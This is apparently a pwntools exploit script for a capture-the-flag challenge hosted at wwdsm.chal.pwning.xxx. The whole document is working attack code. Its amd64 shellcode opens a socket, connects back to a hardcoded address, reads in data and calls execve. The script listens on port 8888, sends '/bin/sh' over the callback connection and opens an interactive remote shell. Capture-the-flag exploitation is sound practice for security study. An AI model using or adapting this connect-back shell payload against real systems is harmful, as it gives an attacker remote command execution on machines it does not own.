from pwn import *
context.arch = "amd64"

p = remote('wwdsm.chal.pwning.xxx', 6615)
p.recvuntil('0f 05 58 \n\n')

code = asm("""
mov    eax,41
mov    edi,2 - 41
mov    esi,1 + 2
mov    edx,0
add    edi,eax
sub    esi,edi
and    edx,esi
syscall

mov    rax,0x8a0a4b2f611e0002
push   rax
mov    eax,42
mov    edx,0x10
mov    edi,{fd}
mov    rsi,rsp
syscall

mov    esi,0x602400
mov    edi,{fd}
mov    edx,0x300
add    eax,0
syscall

mov    edx,esi
mov    eax,59
mov    edi,0x602408
mov    r10d,0x0
syscall
pop    rax
    """.format(fd=0), arch="amd64")

sample = "b800000000bf00000000be00000000ba0000000001c729fe21f20f0548b8000000000000000050b800000000ba00000000bf000000004889000f05be00000000bf00000000ba0000000083c0000f058900b800000000bf0000000041ba000000000f0558".decode('hex')

final = code + sample[len(code):]

reverse = listen(8888)

for i in xrange(len(final)):
    if sample[i] == '\x00':
        print '+',
        p.sendlineafter('?', final[i].encode('hex'))

print code.encode('hex')

context.log_level = "debug"
reverse.wait_for_connection()
reverse.send(p64(0) + '/bin/sh\x00')
reverse.interactive()